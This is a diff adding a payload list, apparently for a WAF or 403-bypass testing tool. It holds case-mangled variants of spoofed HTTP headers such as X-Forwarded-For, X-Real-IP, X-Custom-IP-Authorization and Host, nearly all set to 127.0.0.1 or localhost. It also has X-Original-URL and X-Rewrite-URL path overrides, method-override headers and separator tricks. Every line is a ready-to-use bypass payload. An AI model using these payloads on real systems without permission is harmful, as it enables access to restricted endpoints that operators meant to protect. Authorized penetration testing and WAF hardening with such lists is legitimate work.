@@ -1,0 +1,82 @@
+# ================================================================
+# Header case-sensitivity payloads
+# Same headers as headers.txt, but with different casing to test
+# whether the WAF fails to match case-insensitively.
+# ================================================================
+
+# --- X-Forwarded-For case variants ---
+x-forwarded-for: 127.0.0.1
+X-FORWARDED-FOR: 127.0.0.1
+x-FoRwArDeD-fOr: 127.0.0.1
+X-fOrWaRdEd-FoR: 127.0.0.1
+x-FORWARDED-for: 127.0.0.1
+X-forwarded-FOR: 127.0.0.1
+
+# --- X-Real-IP case variants ---
+x-real-ip: 127.0.0.1
+X-REAL-IP: 127.0.0.1
+x-ReAl-Ip: 127.0.0.1
+x-rEaL-iP: 127.0.0.1
+
+# --- X-Client-IP case variants ---
+x-client-ip: 127.0.0.1
+X-CLIENT-IP: 127.0.0.1
+x-ClIeNt-Ip: 127.0.0.1
+X-cLiEnT-iP: 127.0.0.1
+
+# --- X-Remote-Addr case variants ---
+x-remote-addr: 127.0.0.1
+X-REMOTE-ADDR: 127.0.0.1
+x-ReMoTe-AdDr: 127.0.0.1
+
+# --- X-Remote-IP case variants ---
+x-remote-ip: 127.0.0.1
+X-REMOTE-IP: 127.0.0.1
+x-ReMoTe-Ip: 127.0.0.1
+
+# --- X-Originating-IP case variants ---
+x-originating-ip: 127.0.0.1
+X-ORIGINATING-IP: 127.0.0.1
+x-OrIgInAtInG-Ip: 127.0.0.1
+
+# --- X-Custom-IP-Authorization case variants ---
+x-custom-ip-authorization: 127.0.0.1
+X-CUSTOM-IP-AUTHORIZATION: 127.0.0.1
+x-CuStOm-Ip-AuThOrIzAtIoN: 127.0.0.1
+
+# --- X-Original-URL case variants ---
+x-original-url: {path}
+X-ORIGINAL-URL: {path}
+x-OrIgInAl-UrL: {path}
+X-original-URL: {path}
+
+# --- X-Rewrite-URL case variants ---
+x-rewrite-url: {path}
+X-REWRITE-URL: {path}
+x-ReWrItE-UrL: {path}
+
+# --- X-HTTP-Method-Override case variants ---
+x-http-method-override: GET
+X-HTTP-METHOD-OVERRIDE: GET
+x-HtTp-MeThOd-OvErRiDe: GET
+
+# --- X-Forwarded-Host case variants ---
+x-forwarded-host: 127.0.0.1
+X-FORWARDED-HOST: 127.0.0.1
+x-FoRwArDeD-HoSt: 127.0.0.1
+
+# --- X-Host case variants ---
+x-host: 127.0.0.1
+X-HOST: 127.0.0.1
+x-HoSt: 127.0.0.1
+
+# --- Host header case variants ---
+host: localhost
+HOST: localhost
+hOsT: localhost
+
+# --- X-Forwarded-For with different separators ---
+X-Forwarded-For: 127.0.0.1,127.0.0.1
+X-Forwarded-For: 127.0.0.1, 127.0.0.1
+X-Forwarded-For: 127.0.0.1;127.0.0.1
+X-Forwarded-For: 127.0.0.1 127.0.0.1
